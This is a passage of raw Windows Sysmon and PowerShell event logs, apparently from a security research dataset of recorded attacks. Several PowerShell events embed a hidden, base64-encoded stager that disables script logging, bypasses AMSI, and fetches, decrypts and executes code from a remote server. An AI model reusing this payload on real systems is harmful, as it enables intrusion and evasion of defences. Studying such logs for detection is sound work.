{"SourceModuleType":"im_msvistalog","Version":2,"Message":"Registry value set:\r\nRuleName: -\r\nEventType: SetValue\r\nUtcTime: 2020-09-04 07:29:45.114\r\nProcessGuid: {3ddc5665-e7f3-5f51-dc00-000000000500}\r\nProcessId: 4000\r\nImage: C:\\Windows\\System32\\RuntimeBroker.exe\r\nTargetObject: HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Notifications\\Data\\418A073AA3BC3475\r\nDetails: Binary Data","AccountType":"User","tags":["mordorDataset"],"Domain":"NT AUTHORITY","Opcode":"Info","UserID":"S-1-5-18","SourceName":"Microsoft-Windows-Sysmon","Hostname":"WORKSTATION5.theshire.local","ThreadID":4344,"EventType":"SetValue","RecordNumber":309429,"SeverityValue":2,"SourceModuleName":"eventlog","Keywords":-9223372036854775808,"Severity":"INFO","OpcodeValue":0,"AccountName":"SYSTEM","host":"wec.internal.cloudapp.net","EventID":13,"ProcessId":"4000","port":53971,"@version":"1","ProcessGuid":"{3ddc5665-e7f3-5f51-dc00-000000000500}","Category":"Registry value set (rule: RegistryEvent)","EventReceivedTime":"2020-09-04 03:29:47","Task":13,"UtcTime":"2020-09-04 07:29:45.114","EventTime":"2020-09-04 03:29:45","Channel":"Microsoft-Windows-Sysmon/Operational","@timestamp":"2020-09-04T07:29:47.604Z","Details":"Binary Data","EventTypeOrignal":"INFO","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3080,"RuleName":"-","Image":"C:\\Windows\\System32\\RuntimeBroker.exe","TargetObject":"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Notifications\\Data\\418A073AA3BC3475"}
{"Version":3,"Message":"Process accessed:\r\nRuleName: -\r\nUtcTime: 2020-09-04 07:29:45.114\r\nSourceProcessGUID: {3ddc5665-e7cc-5f51-1000-000000000500}\r\nSourceProcessId: 916\r\nSourceThreadId: 448\r\nSourceImage: C:\\windows\\system32\\svchost.exe\r\nTargetProcessGUID: {3ddc5665-e7d0-5f51-5100-000000000500}\r\nTargetProcessId: 3268\r\nTargetImage: C:\\windows\\System32\\svchost.exe\r\nGrantedAccess: 0x1000\r\nCallTrace: C:\\windows\\SYSTEM32\\ntdll.dll+9c534|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+222a3|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+1a172|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19e3b|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19318|C:\\windows\\SYSTEM32\\ntdll.dll+3081d|C:\\windows\\SYSTEM32\\ntdll.dll+345b4|C:\\windows\\System32\\KERNEL32.DLL+17bd4|C:\\windows\\SYSTEM32\\ntdll.dll+6ce51","SourceThreadId":"448","TargetImage":"C:\\windows\\System32\\svchost.exe","Domain":"NT AUTHORITY","TargetProcessGUID":"{3ddc5665-e7d0-5f51-5100-000000000500}","UserID":"S-1-5-18","Hostname":"WORKSTATION5.theshire.local","EventType":"INFO","SourceProcessGUID":"{3ddc5665-e7cc-5f51-1000-000000000500}","Keywords":-9223372036854775808,"AccountName":"SYSTEM","EventID":10,"ProcessId":"916","Channel":"Microsoft-Windows-Sysmon/Operational","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3080,"SourceModuleType":"im_msvistalog","TargetProcessId":"3268","AccountType":"User","SourceImage":"C:\\windows\\system32\\svchost.exe","Opcode":"Info","SourceName":"Microsoft-Windows-Sysmon","ThreadID":4344,"RecordNumber":309430,"SeverityValue":2,"SourceModuleName":"eventlog","Severity":"INFO","OpcodeValue":0,"host":"wec.internal.cloudapp.net","port":53971,"@version":"1","Category":"Process accessed (rule: ProcessAccess)","GrantedAccess":"0x1000","CallTrace":"C:\\windows\\SYSTEM32\\ntdll.dll+9c534|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+222a3|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+1a172|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19e3b|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19318|C:\\windows\\SYSTEM32\\ntdll.dll+3081d|C:\\windows\\SYSTEM32\\ntdll.dll+345b4|C:\\windows\\System32\\KERNEL32.DLL+17bd4|C:\\windows\\SYSTEM32\\ntdll.dll+6ce51","Task":10,"UtcTime":"2020-09-04 07:29:45.114","EventTime":"2020-09-04 03:29:45","EventReceivedTime":"2020-09-04 03:29:47","@timestamp":"2020-09-04T07:29:47.604Z","tags":["mordorDataset"],"RuleName":"-","SourceProcessId":"916"}
{"Version":3,"Message":"Process accessed:\r\nRuleName: -\r\nUtcTime: 2020-09-04 07:29:45.114\r\nSourceProcessGUID: {3ddc5665-e7cc-5f51-1000-000000000500}\r\nSourceProcessId: 916\r\nSourceThreadId: 448\r\nSourceImage: C:\\windows\\system32\\svchost.exe\r\nTargetProcessGUID: {3ddc5665-e7d0-5f51-5100-000000000500}\r\nTargetProcessId: 3268\r\nTargetImage: C:\\windows\\System32\\svchost.exe\r\nGrantedAccess: 0x1000\r\nCallTrace: C:\\windows\\SYSTEM32\\ntdll.dll+9c534|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+222a3|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+1a172|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19e3b|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19318|C:\\windows\\SYSTEM32\\ntdll.dll+3081d|C:\\windows\\SYSTEM32\\ntdll.dll+345b4|C:\\windows\\System32\\KERNEL32.DLL+17bd4|C:\\windows\\SYSTEM32\\ntdll.dll+6ce51","SourceThreadId":"448","TargetImage":"C:\\windows\\System32\\svchost.exe","Domain":"NT AUTHORITY","TargetProcessGUID":"{3ddc5665-e7d0-5f51-5100-000000000500}","UserID":"S-1-5-18","Hostname":"WORKSTATION5.theshire.local","EventType":"INFO","SourceProcessGUID":"{3ddc5665-e7cc-5f51-1000-000000000500}","Keywords":-9223372036854775808,"AccountName":"SYSTEM","EventID":10,"ProcessId":"916","Channel":"Microsoft-Windows-Sysmon/Operational","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3080,"SourceModuleType":"im_msvistalog","TargetProcessId":"3268","AccountType":"User","SourceImage":"C:\\windows\\system32\\svchost.exe","Opcode":"Info","SourceName":"Microsoft-Windows-Sysmon","ThreadID":4344,"RecordNumber":309431,"SeverityValue":2,"SourceModuleName":"eventlog","Severity":"INFO","OpcodeValue":0,"host":"wec.internal.cloudapp.net","port":53971,"@version":"1","Category":"Process accessed (rule: ProcessAccess)","GrantedAccess":"0x1000","CallTrace":"C:\\windows\\SYSTEM32\\ntdll.dll+9c534|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+222a3|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+1a172|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19e3b|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19318|C:\\windows\\SYSTEM32\\ntdll.dll+3081d|C:\\windows\\SYSTEM32\\ntdll.dll+345b4|C:\\windows\\System32\\KERNEL32.DLL+17bd4|C:\\windows\\SYSTEM32\\ntdll.dll+6ce51","Task":10,"UtcTime":"2020-09-04 07:29:45.114","EventTime":"2020-09-04 03:29:45","EventReceivedTime":"2020-09-04 03:29:47","@timestamp":"2020-09-04T07:29:47.605Z","tags":["mordorDataset"],"RuleName":"-","SourceProcessId":"916"}
{"Version":3,"Message":"Process accessed:\r\nRuleName: -\r\nUtcTime: 2020-09-04 07:29:45.114\r\nSourceProcessGUID: {3ddc5665-e7cc-5f51-1000-000000000500}\r\nSourceProcessId: 916\r\nSourceThreadId: 7376\r\nSourceImage: C:\\windows\\system32\\svchost.exe\r\nTargetProcessGUID: {3ddc5665-e7d0-5f51-5100-000000000500}\r\nTargetProcessId: 3268\r\nTargetImage: C:\\windows\\System32\\svchost.exe\r\nGrantedAccess: 0x1000\r\nCallTrace: C:\\windows\\SYSTEM32\\ntdll.dll+9c534|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+222a3|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+1a172|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19e3b|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19318|C:\\windows\\SYSTEM32\\ntdll.dll+3081d|C:\\windows\\SYSTEM32\\ntdll.dll+345b4|C:\\windows\\System32\\KERNEL32.DLL+17bd4|C:\\windows\\SYSTEM32\\ntdll.dll+6ce51","SourceThreadId":"7376","TargetImage":"C:\\windows\\System32\\svchost.exe","Domain":"NT AUTHORITY","TargetProcessGUID":"{3ddc5665-e7d0-5f51-5100-000000000500}","UserID":"S-1-5-18","Hostname":"WORKSTATION5.theshire.local","EventType":"INFO","SourceProcessGUID":"{3ddc5665-e7cc-5f51-1000-000000000500}","Keywords":-9223372036854775808,"AccountName":"SYSTEM","EventID":10,"ProcessId":"916","Channel":"Microsoft-Windows-Sysmon/Operational","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3080,"SourceModuleType":"im_msvistalog","TargetProcessId":"3268","AccountType":"User","SourceImage":"C:\\windows\\system32\\svchost.exe","Opcode":"Info","SourceName":"Microsoft-Windows-Sysmon","ThreadID":4344,"RecordNumber":309432,"SeverityValue":2,"SourceModuleName":"eventlog","Severity":"INFO","OpcodeValue":0,"host":"wec.internal.cloudapp.net","port":53971,"@version":"1","Category":"Process accessed (rule: ProcessAccess)","GrantedAccess":"0x1000","CallTrace":"C:\\windows\\SYSTEM32\\ntdll.dll+9c534|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+222a3|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+1a172|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19e3b|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19318|C:\\windows\\SYSTEM32\\ntdll.dll+3081d|C:\\windows\\SYSTEM32\\ntdll.dll+345b4|C:\\windows\\System32\\KERNEL32.DLL+17bd4|C:\\windows\\SYSTEM32\\ntdll.dll+6ce51","Task":10,"UtcTime":"2020-09-04 07:29:45.114","EventTime":"2020-09-04 03:29:45","EventReceivedTime":"2020-09-04 03:29:47","@timestamp":"2020-09-04T07:29:47.605Z","tags":["mordorDataset"],"RuleName":"-","SourceProcessId":"916"}
{"Version":3,"Message":"Process accessed:\r\nRuleName: -\r\nUtcTime: 2020-09-04 07:29:45.114\r\nSourceProcessGUID: {3ddc5665-e7cc-5f51-1000-000000000500}\r\nSourceProcessId: 916\r\nSourceThreadId: 7376\r\nSourceImage: C:\\windows\\system32\\svchost.exe\r\nTargetProcessGUID: {3ddc5665-e7d0-5f51-5100-000000000500}\r\nTargetProcessId: 3268\r\nTargetImage: C:\\windows\\System32\\svchost.exe\r\nGrantedAccess: 0x1000\r\nCallTrace: C:\\windows\\SYSTEM32\\ntdll.dll+9c534|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+222a3|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+1a172|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19e3b|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19318|C:\\windows\\SYSTEM32\\ntdll.dll+3081d|C:\\windows\\SYSTEM32\\ntdll.dll+345b4|C:\\windows\\System32\\KERNEL32.DLL+17bd4|C:\\windows\\SYSTEM32\\ntdll.dll+6ce51","SourceThreadId":"7376","TargetImage":"C:\\windows\\System32\\svchost.exe","Domain":"NT AUTHORITY","TargetProcessGUID":"{3ddc5665-e7d0-5f51-5100-000000000500}","UserID":"S-1-5-18","Hostname":"WORKSTATION5.theshire.local","EventType":"INFO","SourceProcessGUID":"{3ddc5665-e7cc-5f51-1000-000000000500}","Keywords":-9223372036854775808,"AccountName":"SYSTEM","EventID":10,"ProcessId":"916","Channel":"Microsoft-Windows-Sysmon/Operational","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3080,"SourceModuleType":"im_msvistalog","TargetProcessId":"3268","AccountType":"User","SourceImage":"C:\\windows\\system32\\svchost.exe","Opcode":"Info","SourceName":"Microsoft-Windows-Sysmon","ThreadID":4344,"RecordNumber":309433,"SeverityValue":2,"SourceModuleName":"eventlog","Severity":"INFO","OpcodeValue":0,"host":"wec.internal.cloudapp.net","port":53971,"@version":"1","Category":"Process accessed (rule: ProcessAccess)","GrantedAccess":"0x1000","CallTrace":"C:\\windows\\SYSTEM32\\ntdll.dll+9c534|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+222a3|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+1a172|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19e3b|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19318|C:\\windows\\SYSTEM32\\ntdll.dll+3081d|C:\\windows\\SYSTEM32\\ntdll.dll+345b4|C:\\windows\\System32\\KERNEL32.DLL+17bd4|C:\\windows\\SYSTEM32\\ntdll.dll+6ce51","Task":10,"UtcTime":"2020-09-04 07:29:45.114","EventTime":"2020-09-04 03:29:45","EventReceivedTime":"2020-09-04 03:29:47","@timestamp":"2020-09-04T07:29:47.606Z","tags":["mordorDataset"],"RuleName":"-","SourceProcessId":"916"}
{"Message":"Pipeline execution details for command line:             Start-Sleep -Seconds $sleepTime;\n. \r\n\r\nContext Information: \r\n\tDetailSequence=1\r\n\tDetailTotal=1\r\n\r\n\tSequenceNumber=2993\r\n\r\n\tUserId=THESHIRE\\pgustavo\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.18362.752\r\n\tHostId=5e60cc9d-d63a-4599-90d3-47e5ecc63e1b\r\n\tHostApplication=C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Win Hidden -enc SQBGACgAJABQAFMAVgBFAFIAUwBpAG8AbgBUAEEAQgBsAEUALgBQAFMAVgBFAFIAUwBJAG8ATgAuAE0AQQBqAE8AcgAgAC0AZwBlACAAMwApAHsAJAA2ADgANgA2AD0AWwBSAGUAZgBdAC4AQQBzAHMAZQBNAEIATABZAC4ARwBFAFQAVAB5AFAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQBUAEYAaQBFAGAAbABEACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAEYAKAAkADYAOAA2ADYAKQB7ACQAMQBmAEUANwA9ACQANgA4ADYANgAuAEcARQBUAFYAYQBsAFUAZQAoACQAbgBVAEwATAApADsASQBmACgAJAAxAEYAZQA3AFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQAMQBGAGUANwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAAxAGYAZQA3AFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAVgBhAGwAPQBbAEMATwBsAEwARQBjAFQASQBvAG4AcwAuAEcAZQBuAGUAcgBpAGMALgBEAGkAQwBUAGkAbwBuAEEAcgB5AFsAcwB0AFIAaQBOAGcALABTAFkAcwB0AEUAbQAuAE8AYgBqAGUAQwB0AF0AXQA6ADoAbgBFAHcAKAApADsAJABWAGEATAAuAEEARABEACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJAB2AEEAbAAuAEEARABEACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkADEARgBFADcAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAdgBhAGwAfQBFAGwAcwBlAHsAWwBTAGMAcgBpAFAAdABCAEwATwBDAEsAXQAuACIARwBlAFQARgBpAEUAYABsAEQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBsAFUARQAoACQAbgBVAEwATAAsACgATgBlAHcALQBPAEIASgBlAGMAdAAgAEMAbwBsAEwAZQBjAHQAaQBPAG4AcwAuAEcAZQBuAEUAUgBJAGMALgBIAEEAcwBIAFMARQBUAFsAUwB0AFIASQBuAGcAXQApACkAfQAkAFIARQBGAD0AWwBSAEUARgBdAC4AQQBzAFMARQBtAEIATABZAC4ARwBlAFQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAJwArACcAVQB0AGkAbABzACcAKQA7ACQAUgBlAEYALgBHAEUAVABGAEkARQBsAEQAKAAnAGEAbQBzAGkASQBuAGkAdABGACcAKwAnAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBMAHUAZQAoACQATgB1AGwAbAAsACQAdABSAFUAZQApADsAfQA7AFsAUwBZAHMAdABFAG0ALgBOAGUAVAAuAFMARQByAHYASQBjAGUAUABvAEkATgB0AE0AQQBOAEEARwBFAHIAXQA6ADoARQBYAFAAZQBjAHQAMQAwADAAQwBvAG4AdABpAE4AVQBFAD0AMAA7ACQARgA5ADQAZQA9AE4ARQB3AC0ATwBCAEoARQBjAHQAIABTAFkAUwB0AEUATQAuAE4AZQB0AC4AVwBFAGIAQwBsAGkARQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQARQB4AHQALgBFAE4AYwBvAEQAaQBOAEcAXQA6ADoAVQBOAGkAQwBPAGQARQAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBDAE8AbgBWAGUAcgBUAF0AOgA6AEYAUgBPAE0AQgBhAHMAZQA2ADQAUwB0AFIAaQBOAEcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AbABvAGcAaQBuAC8AcAByAG8AYwBlAHMAcwAuAHAAaABwACcAOwAkAGYAOQA0AEUALgBIAGUAYQBkAGUAcgBzAC4AQQBkAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJABGADkANABFAC4AUAByAG8AeAB5AD0AWwBTAFkAcwB0AGUAbQAuAE4ARQBUAC4AVwBFAGIAUgBFAFEAdQBlAFMAdABdADoAOgBEAEUARgBhAFUATABUAFcAZQBiAFAAUgBvAFgAWQA7ACQARgA5ADQARQAuAFAAcgBvAFgAWQAuAEMAUgBFAGQAZQBOAHQAaQBhAGwAcwAgAD0AIABbAFMAWQBzAHQAZQBtAC4ATgBlAHQALgBDAFIARQBEAEUAbgBUAEkAQQBsAEMAQQBDAGgARQBdADoAOgBEAGUARgBhAFUATAB0AE4AZQB0AFcATwBSAEsAQwByAGUARABFAE4AVABJAEEATABzADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkAGYAOQA0AGUALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAWQBzAHQAZQBNAC4AVABFAFgAdAAuAEUATgBDAE8ARABpAG4ARwBdADoAOgBBAFMAQwBJAEkALgBHAEUAdABCAFkAVABlAFMAKAAnAD4AaQBeAEwAfgBmACUAeQBbACgAUgBwADAAbgBkAGoALwBQADwASgBrADMAPQBoAEgAcQBlAHQARQA/ADYALQAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAGcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwBVAE4AVABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBCAFgATwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAGYAOQA0AGUALgBIAEUAYQBkAGUAcgBTAC4AQQBkAEQAKAAiAEMAbwBvAGsAaQBlACIALAAiAEcAQgBmAFIAYgBIAGMAcABjAHcAdgA9AGwAVwBsAEMAZwBrAHMAeQBMADMAUAB4AEwAcABBAHkARwB4AEYASQBqAFYATABYADQAMABBAD0AIgApADsAJABEAGEAVABBAD0AJABmADkANABFAC4ARABPAFcATgBsAE8AQQBEAEQAYQBUAGEAKAAkAHMARQBSACsAJAB0ACkAOwAkAGkAdgA9ACQARABBAFQAYQBbADAALgAuADMAXQA7ACQAZABBAFQAQQA9ACQAZABhAHQAYQBbADQALgAuACQAZABBAHQAYQAuAGwAZQBOAEcAdABIAF0AOwAtAEoATwBpAE4AWwBDAEgAYQBSAFsAXQBdACgAJgAgACQAUgAgACQARABBAHQAQQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA\r\n\tEngineVersion=5.1.18362.752\r\n\tRunspaceId=0fd2189f-3371-4502-9a40-5e8afb4bf73d\r\n\tPipelineId=1\r\n\tScriptName=\r\n\tCommandLine=            Start-Sleep -Seconds $sleepTime;\n \r\n\r\nDetails: \r\nCommandInvocation(Start-Sleep): \"Start-Sleep\"\r\nParameterBinding(Start-Sleep): name=\"Seconds\"; value=\"5\"\r\n","Opcode":"Info","SourceName":"PowerShell","Hostname":"WORKSTATION5.theshire.local","EventType":"INFO","ThreadID":0,"RecordNumber":3418,"SeverityValue":2,"SourceModuleName":"eventlog","Keywords":36028797018963968,"Severity":"INFO","host":"wec.internal.cloudapp.net","EventID":800,"port":53971,"@version":"1","Category":"Pipeline Execution Details","EventReceivedTime":"2020-09-04 03:29:47","Task":8,"EventTime":"2020-09-04 03:29:46","Channel":"Windows PowerShell","@timestamp":"2020-09-04T07:29:47.606Z","SourceModuleType":"im_msvistalog","ExecutionProcessID":0,"tags":["mordorDataset"]}
{"Message":"Pipeline execution details for command line:         $IV=[BitConverter]::GetBytes($(Get-Random));\n. \r\n\r\nContext Information: \r\n\tDetailSequence=1\r\n\tDetailTotal=1\r\n\r\n\tSequenceNumber=2995\r\n\r\n\tUserId=THESHIRE\\pgustavo\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.18362.752\r\n\tHostId=5e60cc9d-d63a-4599-90d3-47e5ecc63e1b\r\n\tHostApplication=C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Win Hidden -enc SQBGACgAJABQAFMAVgBFAFIAUwBpAG8AbgBUAEEAQgBsAEUALgBQAFMAVgBFAFIAUwBJAG8ATgAuAE0AQQBqAE8AcgAgAC0AZwBlACAAMwApAHsAJAA2ADgANgA2AD0AWwBSAGUAZgBdAC4AQQBzAHMAZQBNAEIATABZAC4ARwBFAFQAVAB5AFAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQBUAEYAaQBFAGAAbABEACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAEYAKAAkADYAOAA2ADYAKQB7ACQAMQBmAEUANwA9ACQANgA4ADYANgAuAEcARQBUAFYAYQBsAFUAZQAoACQAbgBVAEwATAApADsASQBmACgAJAAxAEYAZQA3AFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQAMQBGAGUANwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAAxAGYAZQA3AFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAVgBhAGwAPQBbAEMATwBsAEwARQBjAFQASQBvAG4AcwAuAEcAZQBuAGUAcgBpAGMALgBEAGkAQwBUAGkAbwBuAEEAcgB5AFsAcwB0AFIAaQBOAGcALABTAFkAcwB0AEUAbQAuAE8AYgBqAGUAQwB0AF0AXQA6ADoAbgBFAHcAKAApADsAJABWAGEATAAuAEEARABEACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJAB2AEEAbAAuAEEARABEACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkADEARgBFADcAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAdgBhAGwAfQBFAGwAcwBlAHsAWwBTAGMAcgBpAFAAdABCAEwATwBDAEsAXQAuACIARwBlAFQARgBpAEUAYABsAEQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBsAFUARQAoACQAbgBVAEwATAAsACgATgBlAHcALQBPAEIASgBlAGMAdAAgAEMAbwBsAEwAZQBjAHQAaQBPAG4AcwAuAEcAZQBuAEUAUgBJAGMALgBIAEEAcwBIAFMARQBUAFsAUwB0AFIASQBuAGcAXQApACkAfQAkAFIARQBGAD0AWwBSAEUARgBdAC4AQQBzAFMARQBtAEIATABZAC4ARwBlAFQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAJwArACcAVQB0AGkAbABzACcAKQA7ACQAUgBlAEYALgBHAEUAVABGAEkARQBsAEQAKAAnAGEAbQBzAGkASQBuAGkAdABGACcAKwAnAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBMAHUAZQAoACQATgB1AGwAbAAsACQAdABSAFUAZQApADsAfQA7AFsAUwBZAHMAdABFAG0ALgBOAGUAVAAuAFMARQByAHYASQBjAGUAUABvAEkATgB0AE0AQQBOAEEARwBFAHIAXQA6ADoARQBYAFAAZQBjAHQAMQAwADAAQwBvAG4AdABpAE4AVQBFAD0AMAA7ACQARgA5ADQAZQA9AE4ARQB3AC0ATwBCAEoARQBjAHQAIABTAFkAUwB0AEUATQAuAE4AZQB0AC4AVwBFAGIAQwBsAGkARQBOAHQAOwAkAHUAPQAnAE0AbwB6AGk